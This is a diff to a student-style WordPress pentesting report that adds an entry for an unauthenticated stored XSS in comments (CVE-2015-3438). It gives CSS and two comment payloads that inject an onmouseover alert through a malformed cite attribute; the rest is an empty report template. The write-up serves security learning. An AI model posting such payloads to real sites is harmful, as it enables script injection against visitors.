@@ -6,51 +6,71 @@ Time spent: **X** hours spent in total
 
 ## Pentesting Report
 
+1. Un-auth XSS in Comment [CVE-2015-3438](https://nvd.nist.gov/vuln/detail/CVE-2015-3438)
+  - Summary:
+    - XSS
+    - 4.1.1
+    - 4.1.2
+  - GIF Walkthrough:
+  - Steps to recreate:
+
+```
+.ohno {
+	display:block;
+	position:fixed;
+	width:100%;
+	height:100%;
+	top:0;
+}
+```
+
+```
+sometext
+<blockquote cite='x onmouseover=alert(1) class=ohno 𝌆'>
+```
+```
+xss
+<q cite='x onmouseover=alert(1) style=display:block;position:fixed;width:100%;height:100%;top:0; 𝌆'>
+```
+  - Reference: [https://cedricvb.be/post/wordpress-stored-xss-vulnerability-4-1-2/]()
+
+
 1. (Required) Vulnerability Name or ID
-  - [ ] Summary: 
+  - Summary:
     - Vulnerability types:
     - Tested in version:
-    - Fixed in version: 
-  - [ ] GIF Walkthrough: 
-  - [ ] Steps to recreate: 
-  - [ ] Affected source code:
+    - Fixed in version:
+  - GIF Walkthrough:
+  - Steps to recreate:
+  - Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
 1. (Required) Vulnerability Name or ID
-  - [ ] Summary: 
+  - Summary:
     - Vulnerability types:
     - Tested in version:
-    - Fixed in version: 
-  - [ ] GIF Walkthrough: 
-  - [ ] Steps to recreate: 
-  - [ ] Affected source code:
-    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
-1. (Required) Vulnerability Name or ID
-  - [ ] Summary: 
-    - Vulnerability types:
-    - Tested in version:
-    - Fixed in version: 
-  - [ ] GIF Walkthrough: 
-  - [ ] Steps to recreate: 
-  - [ ] Affected source code:
+    - Fixed in version:
+  - GIF Walkthrough:
+  - Steps to recreate:
+  - Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
 1. (Optional) Vulnerability Name or ID
-  - [ ] Summary: 
+  - Summary:
     - Vulnerability types:
     - Tested in version:
-    - Fixed in version: 
-  - [ ] GIF Walkthrough: 
-  - [ ] Steps to recreate: 
-  - [ ] Affected source code:
+    - Fixed in version:
+  - GIF Walkthrough:
+  - Steps to recreate:
+  - Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
 1. (Optional) Vulnerability Name or ID
-  - [ ] Summary: 
+  - Summary:
     - Vulnerability types:
     - Tested in version:
-    - Fixed in version: 
-  - [ ] GIF Walkthrough: 
-  - [ ] Steps to recreate: 
-  - [ ] Affected source code:
-    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php) 
+    - Fixed in version:
+  - GIF Walkthrough:
+  - Steps to recreate:
+  - Affected source code:
+    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
 
 ## Assets
 
